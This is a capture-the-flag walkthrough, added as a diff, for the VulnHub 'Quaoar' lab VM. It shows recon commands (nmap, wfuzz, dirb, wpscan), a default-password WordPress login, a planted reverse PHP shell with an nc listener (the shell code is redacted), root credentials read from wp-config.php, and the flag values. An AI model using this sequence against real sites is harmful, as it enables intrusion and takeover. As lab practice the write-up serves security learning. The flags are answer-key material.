@@ -1,0 +1,99 @@
+# Quaoar - https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
+# There should be three "flags"
+# 1) Get a shell
+# 2) Get a Root Shell
+# 3) There's a post exploit flag
+
+# on boot, we see that the VM has obtained an IP Address from my test
+# network's router via DHCP
+# IP Address: 192.168.1.186
+# Also worth mentioning that it clearly boots into an Ubuntu box, but
+# let's not just hung up on that fact.
+
+# Stage 1 - Recon
+nmap -T4 -A -v 192.168.1.186
+
+# nmap shows we have a few open ports:
+# 22 - SSH
+# 53 - DNS
+# 80 - HTTP
+# 110 - POP3
+# 139 - NETBIOS-SSN SAMBA
+# 143 - IMAP
+
+# So, after seeing that 80 is open, I went to http://192.168.1.186/
+# You get a rather simple webpage, so it's clear that the web-server
+# is a part of the enumeration. So, let's find out what pages are available
+
+wfuzz --hc 404 -w /usr/share/wfuzz/wordlist/general/big.txt http://192.168.1.186/FUZZ
+
+# wfuzz didn't show a whole lot:
+# index
+# upload
+# /cgi-bin/
+
+# So, let's run it through dirb and see what we get:
+
+dirb http://192.168.1.186
+
+# dirb was a little more helpful, returning the /wordpress/ directory
+# going to http://192.168.1.186/wordpress we get a pretty default WP page,
+# so, let's go to http://192.168.1.189/wordpress/wp-admin
+# We get a login screen, so, let's go find what users we could use.
+
+wpscan --url http://192.168.1.186/wordpress --enumerate u
+
+# This scan returns the default admin and wpuser account
+
+## PHASE 2 : Enumeration
+
+# Given this, and the fact that we get a default web page, let's try:
+# admin : password [FAILS]
+# admin : admin [WORKS]
+
+# logging into the wp-admin console with admin:admin, we can drop a reverse
+# php shell into the Appearance section of the website ( A lot of the appearance
+# section of WP uses PHP, so it makes for a simple copy-paste )
+
+## PHP Shell Redacted ##
+
+# After adding the reverse-php script in, we go to our Kali host
+
+nc -lvp 1337
+
+# and we get a shell.
+# let's get an actual shell now:
+
+echo "import pty; pty.spawn('bin/bash')" > /tmp/ctf.py
+python /tmp/ctf.py
+
+# now let's get a little more data
+whoami
+www-data
+
+# okay, let's dig around.
+cd /var/www/
+ls
+cd wordpress
+ls
+cat wp-config.php
+
+# Here we see that the mysql user is root, and the password is rootpassword!
+
+su root
+rootpassword!
+
+# and we're in. 2/3 down, one to go.
+locate flag.txt
+cat /home/flag.txt
+2bafe61f03117ac66a73c3c514de796e
+cat /root/flag.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb
+
+# with no other users directories / nothing in root / nothing appearing with the
+# locate command, we need to start digging a little deeper.
+# After some digging I found the flag (finally) in:
+
+cd /etc/cron.d/
+cat /php5
+d46795f84148fd338603d0d6a9dbf8de
